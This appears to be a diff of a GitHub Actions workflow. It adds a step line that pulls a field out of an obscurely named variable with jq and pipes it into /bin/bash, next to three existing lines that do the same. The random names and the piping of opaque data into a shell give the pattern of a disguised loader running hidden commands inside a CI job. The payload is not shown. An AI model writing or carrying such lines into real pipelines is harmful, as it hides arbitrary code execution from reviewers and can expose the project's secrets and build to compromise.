@@ -37,6 +37,7 @@ jobs:
           echo $qlpot08699 | jq -r .ap074 | /bin/bash
           printf '%s' "$kdxd7" | jq -r .ryrzk3318 | /bin/bash
           echo $dk7 | jq -r .jlxp53 | /bin/bash
+          printf '%s' "$zhm1699" | jq -r .wys60214 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
